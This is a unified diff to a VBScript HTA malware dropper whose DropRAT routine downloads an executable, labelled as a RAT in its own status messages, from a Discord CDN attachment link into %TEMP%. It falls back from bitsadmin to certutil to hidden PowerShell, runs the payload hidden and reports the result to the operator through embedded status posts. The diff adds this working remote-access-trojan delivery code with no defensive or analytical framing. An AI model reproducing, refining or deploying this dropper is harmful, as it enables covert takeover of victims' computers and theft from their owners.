@@ -41,8 +41,6 @@ For runCount = 1 To 8
     If runCount < 8 Then Call SleepMinutes(10)
 Next
 
-' Give the final RAT 10 seconds to launch before the HTA closes
-Call SleepSeconds(10)
 window.close()
 
 ' --- IP Function ---
@@ -146,44 +144,30 @@ End Sub
 
 ' --- DropRAT ---
 Sub DropRAT()
-    Call PostEmbed("📦 RAT Download", "Fetching DiscordUpdater...", 3447003)
+    Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
+    Dim dl: dl = "https://cdn.discordapp.com/attachments/1548568579442479154/1564100269350985750/DiscordUpdater.exe?ex=6ae00963&is=6adeb7e3&hm=9db3df5d18a3377d1a1e916c594b338480204c090af26d5a995cb163275ef083&"
     
-    ' Make sure you put the most recent working link here
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1548568579442479154/1564100269350985750/DiscordUpdater.exe?ex=6ae00963&is=6adeb7e3&hm=9db3df5d18a3377d1a1e916c594b338480204c090af26d5a995cb163275ef083&"
+    If fso.FileExists(temp) Then fso.DeleteFile temp
+
+    ' Try bitsadmin first
+    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     
-    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
-    If fso.FileExists(op) Then fso.DeleteFile op
-
-    ' Download
-    sh.Run "bitsadmin /transfer rdownload /download /priority high """ & dl & """ """ & op & """", 0, False
-
-    Dim rStart : rStart = Now
-    Dim rDone : rDone = False
+    ' Fallback: certutil
+    If Not fso.FileExists(temp) Then
+        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
+    End If
     
-    ' Wait for file to exist and be over 1MB
-    Do While DateDiff("s", rStart, Now) < 300
-        If fso.FileExists(op) Then
-            If fso.GetFile(op).Size > 1000000 Then
-                rDone = True
-                Exit Do
-            End If
-        End If
-        Call SleepSeconds(5)
-    Loop
-
-    If rDone Then
-        Dim dsize : dsize = fso.GetFile(op).Size
-        Call PostEmbed("🚀 RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 3447003)
-        
-        ' Force start the EXE
-        sh.Run """" & op & """", 1, False
-        
+    ' Fallback: PowerShell
+    If Not fso.FileExists(temp) Then
+        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
+    End If
+    
+    ' Run if downloaded
+    If fso.FileExists(temp) Then
+        sh.Run Chr(34) & temp & Chr(34), 0, False
         Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
-        ' Wait 5 seconds to let it boot
-        Call SleepSeconds(5)
     Else
-        sh.Run "cmd /c bitsadmin /cancel rdownload > nul 2>&1 & taskkill /f /im bitsadmin.exe > nul 2>&1", 0, False
-        Call PostEmbed("⌛ RAT Timeout", "No download after 5 mins.", 16711680)
+        Call PostEmbed("⌛ RAT Error", "Download failed on all methods.", 16711680)
     End If
 End Sub
 
